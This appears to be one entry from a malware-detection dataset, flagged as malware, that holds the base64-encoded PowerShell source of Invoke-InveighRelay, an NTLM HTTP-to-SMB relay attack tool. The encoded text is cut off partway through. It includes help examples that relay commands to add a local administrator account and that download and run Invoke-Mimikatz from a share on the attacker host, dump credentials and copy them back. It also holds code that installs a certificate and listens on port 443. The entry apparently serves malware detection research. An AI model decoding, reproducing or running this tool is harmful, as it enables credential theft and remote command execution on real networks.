Invoke-InveighRelay.ps1,aaf6ebe9ea2b1d3dfed366df9709b181,Scan result is 32768. IsMalware: 1,RnVuY3Rpb24gSW52b2tlLUludmVpZ2hSZWxheQp7CjwjCi5TWU5PUFNJUwpJbnZva2UtSW52ZWlnaFJlbGF5IHBlcmZvcm1zIE5UTE12MiBIVFRQIHRvIFNNQiByZWxheSB3aXRoIHBzZXhlYyBzdHlsZSBjb21tYW5kIGV4ZWN1dGlvbi4KCi5ERVNDUklQVElPTgpJbnZva2UtSW52ZWlnaFJlbGF5IGN1cnJlbnRseSBzdXBwb3J0cyBOVExNdjIgSFRUUCB0byBTTUIgcmVsYXkgd2l0aCBwc2V4ZWMgc3R5bGUgY29tbWFuZCBleGVjdXRpb24uCgogICAgSFRUUC9IVFRQUyB0byBTTUIgTlRMTXYyIHJlbGF5IHdpdGggZ3JhbnVsYXIgY29udHJvbAogICAgTlRMTXYxL05UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZSBvdmVyIEhUVFAvSFRUUFMKICAgIEdyYW51bGFyIGNvbnRyb2wgb2YgY29uc29sZSBhbmQgZmlsZSBvdXRwdXQKICAgIENhbiBiZSBleGVjdXRlZCBhcyBlaXRoZXIgYSBzdGFuZGFsb25lIGZ1bmN0aW9uIG9yIHRocm91Z2ggSW52b2tlLUludmVpZ2gKCi5QQVJBTUVURVIgSFRUUApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgSFRUUCBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4KCi5QQVJBTUVURVIgSFRUUFMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBIVFRQUyBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZS4gV2FybmluZywgYSBjZXJ0IHdpbGwgYmUgaW5zdGFsbGVkIGluIHRoZSBsb2NhbCBzdG9yZSBhbmQgYXR0YWNoZWQgdG8gcG9ydCA0NDMuCklmIHRoZSBzY3JpcHQgZG9lcyBub3QgZXhpdCBncmFjZWZ1bGx5LCBleGVjdXRlICJuZXRzaCBodHRwIGRlbGV0ZSBzc2xjZXJ0IGlwcG9ydD0wLjAuMC4wOjQ0MyIgYW5kIG1hbnVhbGx5IHJlbW92ZSB0aGUgY2VydGlmaWNhdGUgZnJvbSAiTG9jYWwgQ29tcHV0ZXJcUGVyc29uYWwiIGluIHRoZSBjZXJ0IHN0b3JlLgoKLlBBUkFNRVRFUiBIVFRQU0NlcnRBcHBJRApTcGVjaWZ5IGEgdmFsaWQgYXBwbGljYXRpb24gR1VJRCBmb3IgdXNlIHdpdGggdGhlIGNlcml0aWNhdGUuCgouUEFSQU1FVEVSIEhUVFBTQ2VydFRodW1icHJpbnQKU3BlY2lmeSBhIGNlcnRpZmljYXRlIHRodW1icHJpbnQgZm9yIHVzZSB3aXRoIGEgY3VzdG9tIGNlcnRpZmljYXRlLiBUaGUgY2VydGlmaWNhdGUgZmlsZW5hbWUgbXVzdCBiZSBsb2NhdGVkIGluIHRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5IGFuZCBuYW1lZCBJbnZlaWdoLnBmeC4KCi5QQVJBTUVURVIgQ2hhbGxlbmdlCkRlZmF1bHQgPSBSYW5kb206IFNwZWNpZnkgYSAxNiBjaGFyYWN0ZXIgaGV4IE5UTE0gY2hhbGxlbmdlIGZvciB1c2Ugd2l0aCB0aGUgSFRUUCBsaXN0ZW5lci4gSWYgbGVmdCBibGFuaywgYSByYW5kb20gY2hhbGxlbmdlIHdpbGwgYmUgZ2VuZXJhdGVkIGZvciBlYWNoIHJlcXVlc3QuCk5vdGUgdGhhdCBkdXJpbmcgU01CIHJlbGF5IGF0dGVtcHRzLCB0aGUgY2hhbGxlbmdlIHdpbGwgYmUgcHVsbGVkIGZyb20gdGhlIFNNQiByZWxheSB0YXJnZXQuIAoKLlBBUkFNRVRFUiBNYWNoaW5lQWNjb3VudHMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBzaG93aW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVzIGZyb20gbWFjaGluZSBhY2NvdW50cy4KCi5QQVJBTUVURVIgV1BBREF1dGgKRGVmYXVsdCA9IE5UTE06IChBbm9ueW1vdXMsTlRMTSkgU3BlY2lmeSB0aGUgSFRUUC9IVFRQUyBzZXJ2ZXIgYXV0aGVudGljYXRpb24gdHlwZSBmb3Igd3BhZC5kYXQgcmVxdWVzdHMuIFNldHRpbmcgdG8gQW5vbnltb3VzIGNhbiBwcmV2ZW50IGJyb3dzZXIgbG9naW4gcHJvbXB0cy4KCi5QQVJBTUVURVIgU01CUmVsYXlUYXJnZXQKSVAgYWRkcmVzcyBvZiBzeXN0ZW0gdG8gdGFyZ2V0IGZvciBTTUIgcmVsYXkuCgouUEFSQU1FVEVSIFNNQlJlbGF5Q29tbWFuZApDb21tYW5kIHRvIGV4ZWN1dGUgb24gU01CIHJlbGF5IHRhcmdldC4gVXNlIFBvd2VyU2hlbGwgY2hhcmFjdGVyIGVzY2FwZXMgd2hlcmUgbmVjZXNzYXJ5LgoKLlBBUkFNRVRFUiBTTUJSZWxheVVzZXJuYW1lcwpEZWZhdWx0ID0gQWxsIFVzZXJuYW1lczogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2YgdXNlcm5hbWVzIHRvIHVzZSBmb3IgcmVsYXkgYXR0YWNrcy4gQWNjZXB0cyBib3RoIHVzZXJuYW1lIGFuZCBkb21haW5cdXNlcm5hbWUgZm9ybWF0LiAKCi5QQVJBTUVURVIgU01CUmVsYXlBdXRvRGlzYWJsZQpEZWZhdWx0ID0gRW5hYmxlOiAoWS9OKSBBdXRvbWF0aWNhbHkgZGlzYWJsZSBTTUIgcmVsYXkgYWZ0ZXIgYSBzdWNjZXNzZnVsIGNvbW1hbmQgZXhlY3V0aW9uIG9uIHRhcmdldC4KCi5QQVJBTUVURVIgU01CUmVsYXlOZXR3b3JrVGltZW91dApEZWZhdWx0ID0gTm8gVGltZW91dDogKEludGVnZXIpIFNldCB0aGUgZHVyYXRpb24gaW4gc2Vjb25kcyB0aGF0IEludmVpZ2ggd2lsbCB3YWl0IGZvciBhIHJlcGx5IGZyb20gdGhlIFNNQiByZWxheSB0YXJnZXQgYWZ0ZXIgZWFjaCBwYWNrZXQgaXMgc2VudC4KCi5QQVJBTUVURVIgQ29uc29sZU91dHB1dApEZWZhdWx0ID0gRGlzYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dC4gSWYgdXNpbmcgdGhpcyBvcHRpb24gdGhyb3VnaCBhIHNoZWxsLCB0ZXN0IHRvIGVuc3VyZSB0aGF0IGl0IGRvZXNuJ3QgaGFuZyB0aGUgc2hlbGwuCgouUEFSQU1FVEVSIEZpbGVPdXRwdXQKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSByZWFsIHRpbWUgZmlsZSBvdXRwdXQuCgouUEFSQU1FVEVSIFN0YXR1c091dHB1dApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgc3RhcnR1cCBhbmQgc2h1dGRvd24gbWVzc2FnZXMuCgouUEFSQU1FVEVSIE91dHB1dFN0cmVhbU9ubHkKRGVmYXVsdCA9IERpc2FibGVkOiBFbmFibGUvRGlzYWJsZSBmb3JjaW5nIGFsbCBvdXRwdXQgdG8gdGhlIHN0YW5kYXJkIG91dHB1dCBzdHJlYW0uIFRoaXMgY2FuIGJlIGhlbHBmdWwgaWYgcnVubmluZyBJbnZlaWdoIFJlbGF5IHRocm91Z2ggYSBzaGVsbCB0aGF0IGRvZXMgbm90IHJldHVybiBvdGhlciBvdXRwdXQgc3RyZWFtcy4KTm90ZSB0aGF0IHlvdSB3aWxsIG5vdCBzZWUgdGhlIHZhcmlvdXMgeWVsbG93IHdhcm5pbmcgbWVzc2FnZXMgaWYgZW5hYmxlZC4KCi5QQVJBTUVURVIgT3V0cHV0RGlyCkRlZmF1bHQgPSBXb3JraW5nIERpcmVjdG9yeTogU2V0IGEgdmFsaWQgcGF0aCB0byBhbiBvdXRwdXQgZGlyZWN0b3J5IGZvciBsb2cgYW5kIGNhcHR1cmUgZmlsZXMuIEZpbGVPdXRwdXQgbXVzdCBhbHNvIGJlIGVuYWJsZWQuCgouUEFSQU1FVEVSIFNob3dIZWxwCkRlZmF1bHQgPSBFbmFibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSB0aGUgaGVscCBtZXNzYWdlcyBhdCBzdGFydHVwLgoKLlBBUkFNRVRFUiBSdW5UaW1lCihJbnRlZ2VyKSBTZXQgdGhlIHJ1biB0aW1lIGR1cmF0aW9uIGluIG1pbnV0ZXMuCgouUEFSQU1FVEVSIFRvb2wKRGVmYXVsdCA9IDA6ICgwLDEsMikgRW5hYmxlL0Rpc2FibGUgZmVhdHVyZXMgZm9yIGJldHRlciBvcGVyYXRpb24gdGhyb3VnaCBleHRlcm5hbCB0b29scyBzdWNoIGFzIE1ldGFzcGxvaXQncyBJbnRlcmFjdGl2ZSBQb3dlcnNoZWxsIFNlc3Npb25zIGFuZCBFbXBpcmUuIDAgPSBOb25lLCAxID0gTWV0YXNwbG9pdCwgMiA9IEVtcGlyZSAgCgouRVhBTVBMRQpJbnZva2UtSW52ZWlnaFJlbGF5IC1TTUJSZWxheVRhcmdldCAxOTIuMTY4LjIuNTUgLVNNQlJlbGF5Q29tbWFuZCAibmV0IHVzZXIgRGF2ZSBTcHJpbmcyMDE2IC9hZGQgJiYgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgRGF2ZSAvYWRkIgpFeGVjdXRlIHdpdGggU01CIHJlbGF5IGVuYWJsZWQgd2l0aCBhIGNvbW1hbmQgdGhhdCB3aWxsIGNyZWF0ZSBhIGxvY2FsIGFkbWluaXN0cmF0b3IgYWNjb3VudCBvbiB0aGUgU01CIHJlbGF5IHRhcmdldC4gIAoKLkVYQU1QTEUKSW52b2tlLUludmVpZ2hSZWxheSAtU01CUmVsYXlUYXJnZXQgMTkyLjE2OC4yLjU1IC1TTUJSZWxheUNvbW1hbmQgInBvd2Vyc2hlbGwgXFwxOTIuMTY4LjIuNTBcdGVtcCRccG93ZXJtZXVwLmNtZCIKRXhlY3V0ZSB3aXRoIFNNQiByZWxheSBlbmFibGVkIGFuZCB1c2luZyBNdWJpeCdzIHBvd2VybWV1cC5jbWQgbWV0aG9kIG9mIGxhdW5jaGluZyBJbnZva2UtTWltaWthdHoucHMxIGFuZCB1cGxvYWRpbmcgb3V0cHV0LiBJbiB0aGlzIGV4YW1wbGUsIGEgaGlkZGVuIGFub255bW91cyBzaGFyZSBjb250YWluaW5nIEludm9rZS1NaW1pa2F0ei5wczEgaXMgZW1wbG95ZWQgb24gdGhlIEludmVpZ2ggaG9zdCBzeXN0ZW0uIApQb3dlcm1ldXAuY21kIGNvbnRlbnRzIHVzZWQgZm9yIHRoaXMgZXhhbXBsZToKcG93ZXJzaGVsbCAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdcXDE5Mi4xNjguMi41MFx0ZW1wJFxJbnZva2UtTWltaWthdHoucHMxJyk7IEludm9rZS1NaW1pa2F0eiAtRHVtcENyZWRzID4gXFwxOTIuMTY4LjIuNTBcdGVtcCRcJUNPTVBVVEVSTkFNRSUudHh0IDI+JjEiCk9yaWdpbmFsIHZlcnNpb246Cmh0dHBzOi8vZ2l0aHViLmNvbS9tdWJpeC9wb3N0LWV4cGxvaXRhdGlvbi9ibG9iL21hc3Rlci9zY3JpcHRzL21hc3NfbWltaWthdHovcG93ZXJtZXVwLmNtZAoKLkxJTksKaHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdoCiM+CgojIFBhcmFtZXRlciBkZWZhdWx0IHZhbHVlcyBjYW4gYmUgbW9kaWZpZWQgaW4gdGhpcyBzZWN0aW9uOgpwYXJhbQooIAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW3N0cmluZ10kSFRUUD0iWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bc3RyaW5nXSRIVFRQUz0iTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bc3RyaW5nXSRDb25zb2xlT3V0cHV0PSJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtzdHJpbmddJEZpbGVPdXRwdXQ9Ik4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW3N0cmluZ10kU3RhdHVzT3V0cHV0PSJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtzdHJpbmddJE91dHB1dFN0cmVhbU9ubHk9Ik4iLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW3N0cmluZ10kTWFjaGluZUFjY291bnRzPSJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtzdHJpbmddJFNob3dIZWxwPSJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtzdHJpbmddJFNNQlJlbGF5QXV0b0Rpc2FibGU9IlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIkFub255bW91cyIsIk5UTE0iKV1bc3RyaW5nXSRXUEFEQXV0aD0iTlRMTSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiMCIsIjEiLCIyIildW3N0cmluZ10kVG9vbD0iMCIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoICRffSldW3N0cmluZ10kT3V0cHV0RGlyPSIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXVtWYWxpZGF0ZVNjcmlwdCh7JF8gLW1hdGNoIFtJUEFkZHJlc3NdJF8gfSldW3N0cmluZ10kU01CUmVsYXlUYXJnZXQgPSIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVQYXR0ZXJuKCdeW0EtRmEtZjAtOV17MTZ9JCcpXVtzdHJpbmddJENoYWxsZW5nZT0iIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW2FycmF5XSRTTUJSZWxheVVzZXJuYW1lcz0iIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW2ludF0kU01CUmVsYXlOZXR3b3JrVGltZW91dD0iIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW2ludF0kUnVuVGltZT0iIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bc3RyaW5nXSRTTUJSZWxheUNvbW1hbmQgPSAiIiwgCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtzdHJpbmddJEhUVFBTQ2VydEFwcElEPSIwMDExMjIzMy00NDU1LTY2NzctODg5OS1BQUJCQ0NEREVFRkYiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bc3RyaW5nXSRIVFRQU0NlcnRUaHVtYnByaW50PSI5OGMxZDU0ODQwYzVjMTJjZWQ3MTA3NThiNmVlNTZjYzYyZmExZjBkIiwKICAgIFtwYXJhbWV0ZXIoVmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzPSR0cnVlKV0kaW52YWxpZF9wYXJhbWV0ZXIKKQoKaWYgKCRpbnZhbGlkX3BhcmFtZXRlcikKewogICAgdGhyb3cgIiQoJGludmFsaWRfcGFyYW1ldGVyKSBpcyBub3QgYSB2YWxpZCBwYXJhbWV0ZXIuIgp9CgppZighJFNNQlJlbGF5VGFyZ2V0KQp7CiAgICBUaHJvdyAiWW91IG11c3Qgc3BlY2lmeSBhbiAtU01CUmVsYXlUYXJnZXQgaWYgZW5hYmxpbmcgLVNNQlJlbGF5Igp9CgppZighJFNNQlJlbGF5Q29tbWFuZCkKewogICAgVGhyb3cgIllvdSBtdXN0IHNwZWNpZnkgYW4gLVNNQlJlbGF5Q29tbWFuZCBpZiBlbmFibGluZyAtU01CUmVsYXkiCn0KCmlmKCEkT3V0cHV0RGlyKQp7IAogICAgJG91dHB1dF9kaXJlY3RvcnkgPSAkUFdELlBhdGgKfQplbHNlCnsKICAgICRvdXRwdXRfZGlyZWN0b3J5ID0gJE91dHB1dERpcgp9CgppZighJGludmVpZ2gpCnsKICAgICRnbG9iYWw6aW52ZWlnaCA9IFtoYXNodGFibGVdOjpTeW5jaHJvbml6ZWQoQHt9KQogICAgJGludmVpZ2gubG9nID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjFfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYyX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCA9IEAoKQogICAgJGludmVpZ2guU01CUmVsYXlfZmFpbGVkX2xpc3QgPSBAKCkKfQoKaWYoJGludmVpZ2guSFRUUF9saXN0ZW5lci5Jc0xpc3RlbmluZykKewogICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5TdG9wKCkKICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuQ2xvc2UoKQp9CgppZighJGludmVpZ2gucnVubmluZykKewogICAgJGludmVpZ2guY29uc29sZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9hcHBsaWNhdGlvbl9JRCA9ICRIVFRQU0NlcnRBcHBJRAogICAgJGludmVpZ2guY2VydGlmaWNhdGVfdGh1bWJwcmludCA9ICRIVFRQU0NlcnRUaHVtYnByaW50CiAgICAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guY29uc29sZV9vdXRwdXQgPSAkZmFsc2UKICAgICRpbnZlaWdoLmNvbnNvbGVfaW5wdXQgPSAkdHJ1ZQogICAgJGludmVpZ2guZmlsZV9vdXRwdXQgPSAkZmFsc2UKICAgICRpbnZlaWdoLmxvZ19vdXRfZmlsZSA9ICRvdXRwdXRfZGlyZWN0b3J5ICsgIlxJbnZlaWdoLUxvZy50eHQiCiAgICAkaW52ZWlnaC5OVExNdjFfb3V0X2ZpbGUgPSAkb3V0cHV0X2RpcmVjdG9yeSArICJcSW52ZWlnaC1OVExNdjEudHh0IgogICAgJGludmVpZ2guTlRMTXYyX291dF9maWxlID0gJG91dHB1dF9kaXJlY3RvcnkgKyAiXEludmVpZ2gtTlRMTXYyLnR4dCIKICAgICRJbnZlaWdoLmNoYWxsZW5nZSA9ICRDaGFsbGVuZ2UKfQoKJGludmVpZ2gucmVsYXlfcnVubmluZyA9ICR0cnVlCiRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKJGludmVpZ2guU01CX3JlbGF5ID0gJHRydWUKCmlmKCRTdGF0dXNPdXRwdXQgLWVxICd5JykKewogICAgJGludmVpZ2guc3RhdHVzX291dHB1dCA9ICR0cnVlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfb3V0cHV0ID0gJGZhbHNlCn0KCmlmKCRPdXRwdXRTdHJlYW1Pbmx5IC1lcSAneScpCnsKICAgICRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSA9ICR0cnVlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkZmFsc2UKfQoKaWYoJFRvb2wgLWVxIDEpICMgTWV0YXNwbG9pdCBJbnRlcmFjdGl2ZSBQb3dlcnNoZWxsCnsKICAgICRpbnZlaWdoLnRvb2wgPSAxCiAgICAkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkgPSAkdHJ1ZQogICAgJGludmVpZ2gubmV3bGluZSA9ICIiCiAgICAkQ29uc29sZU91dHB1dCA9ICJOIgp9CmVsc2VpZigkVG9vbCAtZXEgMikgIyBQb3dlclNoZWxsIEVtcGlyZQp7CiAgICAkaW52ZWlnaC50b29sID0gMgogICAgJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5ID0gJHRydWUKICAgICRpbnZlaWdoLmNvbnNvbGVfaW5wdXQgPSAkZmFsc2UKICAgICRpbnZlaWdoLm5ld2xpbmUgPSAiYG4iCiAgICAkQ29uc29sZU91dHB1dCA9ICJZIgogICAgJFNob3dIZWxwID0gIk4iCn0KZWxzZQp7CiAgICAkaW52ZWlnaC50b29sID0gMAogICAgJGludmVpZ2gubmV3bGluZSA9ICIiCn0KCiMgV3JpdGUgc3RhcnR1cCBtZXNzYWdlcwppZighJGludmVpZ2gucnVubmluZykKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiSW52ZWlnaCBSZWxheSBzdGFydGVkIGF0ICQoR2V0LURhdGUgLWZvcm1hdCAncycpIil8T3V0LU51bGwKICAgICRpbnZlaWdoLmxvZy5hZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggUmVsYXkgc3RhcnRlZCIpXSkgfE91dC1OdWxsCgogICAgaWYoJEhUVFAgLWVxICd5JykKICAgIHsKICAgICAgICAkaW52ZWlnaC5IVFRQID0gJHRydWUKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJIVFRQIENhcHR1cmUgRW5hYmxlZCIpfE91dC1OdWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guSFRUUCA9ICRmYWxzZQogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5hZGQoIkhUVFAgQ2FwdHVyZSBEaXNhYmxlZCIpfE91dC1OdWxsCiAgICB9CgogICAgaWYoJEhUVFBTIC1lcSAneScpCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICR0cnVlCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlTdG9yZSgiTXkiLCJMb2NhbE1hY2hpbmUiKQogICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuT3BlbignUmVhZFdyaXRlJykKICAgICAgICAgICAgJGNlcnRpZmljYXRlID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXMuWDUwOUNlcnRpZmljYXRlMgogICAgICAgICAgICAkY2VydGlmaWNhdGUuSW1wb3J0KCRQV0QuUGF0aCArICJcSW52ZWlnaC5wZngiKQogICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuQWRkKCRjZXJ0aWZpY2F0ZSkgCiAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5DbG9zZSgpCiAgICAgICAgICAgICRuZXRzaF9jZXJ0aGFzaCA9ICJjZXJ0aGFzaD0iICsgJGludmVpZ2guY2VydGlmaWNhdGVfdGh1bWJwcmludAogICAgICAgICAgICAkbmV0c2hfYXBwX0lEID0gImFwcGlkPXsiICsgJGludmVpZ2guY2VydGlmaWNhdGVfYXBwbGljYXRpb25fSUQgKyAifSIKICAgICAgICAgICAgJG5ldHNoX2FyZ3VtZW50cyA9IEAoImh0dHAiLCJhZGQiLCJzc2xjZXJ0IiwiaXBwb3J0PTAuMC4wLjA6NDQzIiwkbmV0c2hfY2VydGhhc2gsJG5ldHNoX2FwcF9JRCkKICAgICAgICAgICAgJiAibmV0c2giICRuZXRzaF9hcmd1bWVudHMgPiAkbnVsbAogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJIVFRQUyBDYXB0dXJlIEVuYWJsZWQiKXxPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLkNsb3NlKCkKICAgICAgICAgICAgJEhUVFBTPSJOIgogICAgICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICRmYWxzZQogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJIVFRQUyBDYXB0dXJlIERpc2FibGVkIER1ZSBUbyBDZXJ0aWZpY2F0ZSBJbnN0YWxsIEVycm9yIil8T3V0LU51bGwKICAgICAgICB9CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiSFRUUFMgQ2FwdHVyZSBEaXNhYmxlZCIpfE91dC1OdWxsCiAgICB9CgogICAgaWYoJENoYWxsZW5nZSkKICAgIHsKICAgICAgICAkSW52ZWlnaC5jaGFsbGVuZ2UgPSAkY2hhbGxlbmdlCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiTlRMTSBDaGFsbGVuZ2UgPSAkQ2hhbGxlbmdlIil8T3V0LU51bGwKICAgIH0KCiAgICBpZigkTWFjaGluZUFjY291bnRzIC1lcSAnbicpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiSWdub3JpbmcgTWFjaGluZSBBY2NvdW50cyIpfE91dC1OdWxsCiAgICB9CgogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiRm9yY2UgV1BBRCBBdXRoZW50aWNhdGlvbiA9ICRXUEFEQXV0aCIpfE91dC1OdWxsCgogICAgaWYoJENvbnNvbGVPdXRwdXQgLWVxICd5JykKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJSZWFsIFRpbWUgQ29uc29sZSBPdXRwdXQgRW5hYmxlZCIpfE91dC1OdWxsCiAgICAgICAgJGludmVpZ2guY29uc29sZV9vdXRwdXQgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgIGlmKCRpbnZlaWdoLnRvb2wgLWVxIDEpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJSZWFsIFRpbWUgQ29uc29sZSBPdXRwdXQgRGlzYWJsZWQgRHVlIFRvIEV4dGVybmFsIFRvb2wgU2VsZWN0aW9uIil8T3V0LU51bGwKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiUmVhbCBUaW1lIENvbnNvbGUgT3V0cHV0IERpc2FibGVkIil8T3V0LU51bGwKICAgICAgICB9CiAgICB9CgogICAgaWYoJEZpbGVPdXRwdXQgLWVxICd5JykKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuYWRkKCJSZWFsIFRpbWUgRmlsZSBPdXRwdXQgRW5hYmxlZCIpfE91dC1OdWxsCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLmFkZCgiT3V0cHV0IERpcmVjdG9yeSA9ICRvdXRwdXRfZGlyZWN0b3J5Iil8T3V0LU51bGwKICAgICAgICAkaW52ZWlnaC5maWxlX291dHB1dCA9ICR0cnVlCiAgICB9CiAg